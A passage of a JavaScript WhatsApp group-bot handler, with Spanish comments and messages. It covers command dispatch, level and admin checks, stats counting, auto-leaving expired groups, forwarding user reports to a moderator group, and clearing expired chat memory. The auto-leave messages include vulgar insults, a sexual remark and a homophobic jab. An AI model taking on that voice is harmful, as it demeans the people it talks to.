return m.reply(`*⚠️ 𝐍𝐞𝐜𝐞𝐬𝐢𝐭𝐚 𝐞𝐥 𝐧𝐢𝐯𝐞𝐥 ${plugin.level}, 𝐩𝐚𝐫𝐚 𝐩𝐨𝐝𝐞𝐫 𝐮𝐬𝐚𝐫 𝐞𝐬𝐭𝐞 𝐜𝐨𝐦𝐚𝐧𝐝𝐨, 𝐓𝐮 𝐧𝐢𝐯𝐞𝐥 𝐚𝐜𝐭𝐮𝐚𝐥 𝐞𝐬:* ${nivel}`);
}} catch (err) {
console.error(err);
}}

if (modoAdminActivo && !isAdmin && !isOwner) {
return !0
//m.reply("⚠️ Este grupo tiene *modo admin* activado. Solo los administradores pueden usar comandos.");
}

try {
logCommand({conn,
sender: m.sender,
chatId: m.chat,
isGroup: m.isGroup,
command: command,
timestamp: new Date()
});

try {
await plugin(m, { conn, text, args, usedPrefix, command, participants, metadata, isOwner, isROwner, isAdmin: m.isAdmin, isBotAdmin, isGroup });
} catch (e) {
if (typeof e === 'string') {
await m.reply(e);
return; 
}
console.error(e);
return; 
}

await db.query(`INSERT INTO stats (command, count)
    VALUES ($1, 1)
    ON CONFLICT (command) DO UPDATE SET count = stats.count + 1
  `, [command]);

} catch (err) {
console.error(chalk.red(`❌ Error al ejecutar ${handler.command}: ${err}`));
m.reply("❌ Error ejecutando el comando, reporte este error a mi creador con el comando: /report\n\n" + err);
}}
}

//auto-leave
setInterval(async () => {
try {
let conn = global.conn || globalThis.conn;
if (!conn || typeof conn.groupLeave !== 'function') return;
const { rows } = await db.query("SELECT group_id, expired FROM group_settings WHERE expired IS NOT NULL AND expired > 0 AND expired < $1", [Date.now()]);

for (let { group_id } of rows) {
try {
await conn.sendMessage(group_id, { text: [`*${conn.user.name}*,ᴹᵉ ᵛᵒʸ ᵈᵉˡ ᵉˡ ᵍʳᵘᵖᵒ ᶠᵘᵉ ᵘⁿ ᵍᵘˢᵗᵒ ᵉˢᵗᵃ ᵃᵠᵘᶦ́ ˢᶦ ᵠᵘᶦᵉʳᵉˢ ᵠᵘᵉ ᵛᵘᵉˡᵛᵃ ᵁˢᵉʳ ᵈᵉ ⁿᵘᵉᵛᵒ ᵉˡ ᶜᵒᵐᵃⁿᵈᵒ`, `Bueno me voy de este grupo de mrd, no me agregue a grupo ptm`, `*${conn.user.name}*, me voy de este grupito culiado nada interesante yo queria ver teta y son puro gays aca 🤣`].getRandom() });
await new Promise(r => setTimeout(r, 3000));
await conn.groupLeave(group_id);
await db.query("UPDATE group_settings SET expired = NULL WHERE group_id = $1", [group_id]);
console.log(`[AUTO-LEAVE] Bot salió automáticamente del grupo: ${group_id}`);
} catch (e) {
}}
} catch (e) {
}}, 60_000); //1 min

//report
setInterval(async () => {
const MODGROUP_ID = "120363392819528942@g.us";
try {
let conn = global.conn || globalThis.conn;
if (!conn || typeof conn.sendMessage !== "function") return;
let modsMeta;
try {
modsMeta = await conn.groupMetadata(MODGROUP_ID);
} catch (e) {
return;
}
const res = await db.query("SELECT * FROM reportes WHERE enviado = false ORDER BY fecha ASC LIMIT 10");
if (!res.rows.length) return;

for (const row of res.rows) {
let cabecera = row.tipo === "sugerencia" ? "🌟 *SUGERENCIA*" : "ＲＥＰＯＲＴＥ";
const txt = `┏╼╾╼⧼⧼⧼ ${cabecera}  ⧽⧽⧽╼╼╼┓\n╏• *Usuario:* wa.me/${row.sender_id.split("@")[0]}\n╏• ${row.tipo === "sugerencia" ? "*Sugerencia:*" : "*Mensaje:*"} ${row.mensaje}\n┗╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼`;
await conn.sendMessage(MODGROUP_ID, { text: txt });
await db.query("DELETE FROM reportes WHERE id = $1", [row.id]);
}} catch (err) {
console.error("[REPORT/SUGGE SYSTEM ERROR]", err);
}}, 60_000 * 2); // cada 2 minutos

//cache message 
setInterval(async () => {
try {
const { rows } = await db.query(`SELECT chat_memory.chat_id, chat_memory.updated_at, 
             COALESCE(group_settings.memory_ttl, 86400) AS memory_ttl
      FROM chat_memory
      JOIN group_settings ON chat_memory.chat_id = group_settings.group_id
      WHERE group_settings.memory_ttl > 0
    `);

const now = Date.now();
for (const row of rows) {
const { chat_id, updated_at, memory_ttl } = row;
const lastUpdated = new Date(updated_at).getTime(); // en ms
const ttl = memory_ttl * 1000; 

if (now - lastUpdated > ttl) {
await db.query("DELETE FROM chat_memory WHERE chat_id = $1", [chat_id]);
console.log(`🧹 Memoria del grupo ${chat_id} eliminada automáticamente`);
}}
} catch (err) {
console.error("❌ Error limpiando memorias expiradas:", err);
}}, 300_000); // cada 5 minutos

//---
let file = fileURLToPath(import.meta.url);
watchFile(file, () => {
  unwatchFile(file);
  console.log(chalk.redBright('Update \'handler.js\''));
  import(`${file}?update=${Date.now()}`);
});